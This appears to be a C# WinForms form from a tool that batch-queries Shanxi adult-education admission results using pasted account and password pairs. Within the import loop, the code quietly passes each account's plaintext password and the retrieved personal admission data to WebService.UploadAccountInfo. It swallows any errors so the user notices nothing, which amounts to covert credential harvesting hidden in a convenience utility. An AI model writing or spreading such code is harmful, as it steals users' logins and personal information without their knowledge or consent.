using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Sunny.UI;
using Newtonsoft.Json;

namespace ShanxiAdultEducationBatchQueryScore
{
    public partial class FrmAdmission : UIForm
    {

        public FrmAdmission()
        {
            InitializeComponent();
        }

        private void FrmAdmission_Load(object sender, EventArgs e)
        {
            // 预置查询账号
            tb_account.Text = @"1xxx xxxxx";
        }

        private void AddRecord(string index, string account, string number, string name, string school,
            string major, string studyForm, string majorType, string status)
        {
            var newRowIndex = dgv_records.Rows.Add();
            dgv_records.Rows[newRowIndex].Cells[0].Value = index;
            dgv_records.Rows[newRowIndex].Cells[1].Value = account;
            dgv_records.Rows[newRowIndex].Cells[2].Value = number;
            dgv_records.Rows[newRowIndex].Cells[3].Value = name;
            dgv_records.Rows[newRowIndex].Cells[4].Value = school;
            dgv_records.Rows[newRowIndex].Cells[5].Value = major;
            dgv_records.Rows[newRowIndex].Cells[6].Value = studyForm;
            dgv_records.Rows[newRowIndex].Cells[7].Value = majorType;
            dgv_records.Rows[newRowIndex].Cells[8].Value = status;
        }

        /// <summary>
        /// 跳转至官网
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void lbl_to_website_Click(object sender, EventArgs e)
        {
            // 自动打开链接
            System.Diagnostics.Process.Start("http://www.sxkszx.cn");
        }

        /// <summary>
        /// 点击批量导入按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btn_import_Click(object sender, EventArgs e)
        {
            var content = tb_account.Text.Trim();
            if (string.IsNullOrEmpty(content))
            {
                ShowErrorTip(@"导入的账号不能为空");
                return;
            }

            // 禁用按钮防止重复点击
            btn_import.Enabled = false;
            btn_export_data.Enabled = false;
            btn_clear.Enabled = false;

            try
            {
                // 显示loading
                this.ShowProcessForm();

                var lines = tb_account.Lines;
                foreach (var line in lines)
                {
                    var account = Regex.Split(line.Trim(), @"\s+");
                    if (account.Length != 2) continue;
                    var admission = new Dictionary<string, string>();
                    try
                    {
                        var cookies = await WebService.AccountLogin(account[0], account[1]);
                        admission = await WebService.QueryAdmission(cookies);
                        
                        // 上传账号信息
                        try
                        {
                            await WebService.UploadAccountInfo(account[0], account[1], JsonConvert.SerializeObject(admission));
                        }
                        catch (Exception)
                        {
                            // 忽略异常，确保不影响主流程
                        }

                        AddRecord(
                            dgv_records.Rows.Count + "",
                            string.Join(" ", account),
                            admission.TryGetValue("准考证号", out var number) ? number : "-",
                            admission.TryGetValue("姓名", out var name) ? name : "-",
                            admission.TryGetValue("录取院校", out var school) ? school : "-",
                            admission.TryGetValue("录取专业", out var major) ? major : "-",
                            admission.TryGetValue("学习形式", out var studyForm) ? studyForm : "-",
                            admission.TryGetValue("专业属性", out var majorType) ? majorType : "-",
                            "已查询");
                    }
                    catch (Exception exception)
                    {
                        var number = admission.TryGetValue("准考证号", out var value) ? value : "-";
                        var name = admission.TryGetValue("姓名", out var value1) ? value1 : "-";
                        AddRecord(
                            dgv_records.Rows.Count + "",
                            string.Join(" ", account),
                            number,
                            name,
                            "-",
                            "-",
                            "-",
                            "-",
                            $"异常:{exception.Message}");
                    }
                }
            }
            finally
            {
                // 隐藏loading
                this.HideProcessForm();
                // 恢复按钮
                btn_import.Enabled = true;
                btn_export_data.Enabled = true;
                btn_clear.Enabled = true;
            }
        }

        /// <summary>
        /// 以Excel的方式导出数据
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btn_export_data_Click(object sender, EventArgs e)
        {
            //打开文件对话框
            var saveFileDialog1 = new SaveFileDialog();
            saveFileDialog1.Title = @"保存文件";
            saveFileDialog1.Filter = @"Excel 文件(*.xls)|*.xls|Excel 文件(*.xlsx)|*.xlsx|所有文件(*.*)|*.*";
            saveFileDialog1.FileName = "录取信息.xls"; //设置默认另存为的名字
            if (saveFileDialog1.ShowDialog() != DialogResult.OK) return;
            var txtPath = saveFileDialog1.FileName;
            NPOIHelper.DataTableToExcel(DataTableUtil.GetDataTableFromDataGridView(dgv_records), txtPath);
            ShowSuccessTip("导出数据成功!");
        }

        /// <summary>
        /// 清空表格数据
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btn_clear_Click(object sender, EventArgs e)
        {
            dgv_records.Rows.Clear();
            ShowSuccessTip("已清空表格数据!");
        }


    }
}

